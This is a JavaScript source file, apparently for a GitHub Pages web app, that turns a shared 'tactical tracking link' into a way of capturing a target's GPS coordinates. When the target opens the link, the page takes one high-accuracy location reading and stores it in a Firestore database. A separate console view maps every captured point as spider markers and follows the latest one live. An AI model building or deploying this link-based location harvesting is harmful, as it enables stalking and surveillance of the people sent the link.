import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// --- CONFIGURA AQUÍ TUS CREDENCIALES DE FIREBASE ---
const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "tu-proyecto.firebaseapp.com",
    projectId: "tu-proyecto",
    storageBucket: "tu-proyecto.appspot.com",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};
// ---------------------------------------------------

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let map;
let mainMarker;
const marcadoresAraña = L.layerGroup(); // Grupo para los puntos históricos
const ubicacionPorDefecto = [14.3333, -90.6667]; 

// Detectar si la URL trae un parámetro de objetivo
const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

document.addEventListener("DOMContentLoaded", function () {
    // Inicializar el mapa
    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
    marcadoresAraña.addTo(map);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    mainMarker = L.marker(ubicacionPorDefecto, {
        zIndexOffset: 1000
    }).addTo(map)
      .bindPopup("<b>Sistema centralizado.</b> Esperando señal...");

    setTimeout(() => { map.invalidateSize(); }, 200);

    // ESCENARIO A: Alguien abrió el enlace en su celular (El "pestañeo" único)
    if (targetId) {
        document.getElementById('banner-status').innerHTML = "OBTENIENDO SEÑAL<br>GPS ÚNICO...";
        capturarYEnviarUbicacionUnica(targetId);
    } else {
        // ESCENARIO B: Estás en tu consola principal; cargamos todas las arañas del historial
        document.getElementById('banner-status').innerHTML = "CONSOLA CENTRAL<br>CARGANDO ARAÑAS...";
        cargarPuntosHistoricos("objetivo_principal");
        escucharObjetivoEnTiempoReal("objetivo_principal");
    }
});

// --- FUNCIONALIDAD DE CAPTURA ÚNICA (EL PESTAÑEO) ---
function capturarYEnviarUbicacionUnica(id) {
    if (!navigator.geolocation) {
        document.getElementById('banner-status').innerHTML = "ERROR<br>GPS NO SOPORTADO";
        return;
    }

    // Obtener la ubicación una sola vez (pestañeo rápido)
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const timestamp = new Date();

            try {
                // 1. Guardar en la subcolección de historial para que aparezca la araña 🕷️
                const refHistorial = doc(collection(db, "rastreos", id, "lecturas"));
                await setDoc(refHistorial, { lat, lng, timestamp });

                // 2. Actualizar también el documento principal por si acaso
                await setDoc(doc(db, "rastreos", id), { lat, lng, timestamp });

                document.getElementById('banner-status').innerHTML = "SEÑAL CAPTURADA<br>TRANSMISIÓN EXITOSA";
                console.log("Ubicación única enviada:", lat, lng);
            } catch (e) {
                console.error("Error al escribir en la base de datos:", e);
                document.getElementById('banner-status').innerHTML = "ERROR DE RED<br>AL TRANSMITIR";
            }
        },
        (error) => {
            console.error("Error de GPS:", error);
            document.getElementById('banner-status').innerHTML = "ACCESO DENEGADO<br>AL GPS";
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

// --- VISUALIZACIÓN EN CONSOLA PRINCIPAL ---

// Cargar todos los puntos en forma de araña 🕷️
async function cargarPuntosHistoricos(id) {
    marcadoresAraña.clearLayers();

    try {
        const lecturasRef = collection(db, "rastreos", id, "lecturas");
        const q = query(lecturasRef, orderBy("timestamp", "asc"));
        const querySnapshot = await getDocs(q);
        
        let ultimaUbicacion = null;

        querySnapshot.forEach((docSnap) => {
            const data = docSnap.data();
            const lat = data.lat;
            const lng = data.lng;
            const timestamp = data.timestamp ? data.timestamp.toDate() : new Date();

            // Crear icono personalizado con el emoji de araña
            const spiderIcon = L.divIcon({
                html: '🕷️',
                className: 'spider-marker',
                iconSize: [24, 24],
                iconAnchor: [12, 12]
            });

            // Añadir al mapa como marcador de araña
            L.marker([lat, lng], { icon: spiderIcon })
                .addTo(marcadoresAraña)
                .bindPopup(`<b>Punto de Acceso (Araña)</b><br>Hora: ${timestamp.toLocaleTimeString()}`);
            
            ultimaUbicacion = [lat, lng];
        });

        if (ultimaUbicacion) {
            map.fitBounds(marcadoresAraña.getBounds().pad(0.1));
            document.getElementById('banner-status').innerHTML = "RED DE ARAÑAS ACTIVA<br>PUNTOS CARGADOS";
        } else {
            document.getElementById('banner-status').innerHTML = "SIN PUNTOS DE ACCESO<br>REGISTRADOS";
        }

    } catch (e) {
        console.error("Error al cargar historial de arañas:", e);
    }
}

// Escuchar actualizaciones en tiempo real (si se abriera otra vez)
function escucharObjetivoEnTiempoReal(id) {
    onSnapshot(doc(db, "rastreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            const lat = data.lat;
            const lng = data.lng;

            mainMarker.setLatLng([lat, lng]);
            mainMarker.bindPopup(`<b>Último Acceso Detectado</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`);
        }
    });
}

// --- BOTONES Y UTILIDADES ---

window.compartirEnlace = function() {
    const baseUrl = "https://mmommo52.github.io/Spidey/";
    const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
    
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("¡Enlace táctico de rastreo único copiado!\nAl abrirlo, hará un pestañeo de GPS y registrará una araña.");
    }).catch(err => {
        console.error("Error al copiar enlace:", err);
    });
};

window.obtenerUbicacionActual = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            map.setView([lat, lng], 16);
            L.circleMarker([lat, lng], { radius: 10, color: 'blue', fillColor: 'blue', fillOpacity: 0.3 })
                .addTo(map)
                .bindPopup("Tu posición local");
        });
    }
};

window.centrarEnMiUbicacion = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            map.setView([pos.coords.latitude, pos.coords.longitude], 17);
        }, () => { alert("No se pudo obtener tu ubicación."); }, { enableHighAccuracy: true });
    }
};

window.accionRastrearObjetivo = () => alert("Protocolo de rastreo único listo en el enlace compartido.");
window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat seguro abierto.");
window.verArchivo = () => alert("Abriendo registros históricos de arañas...");
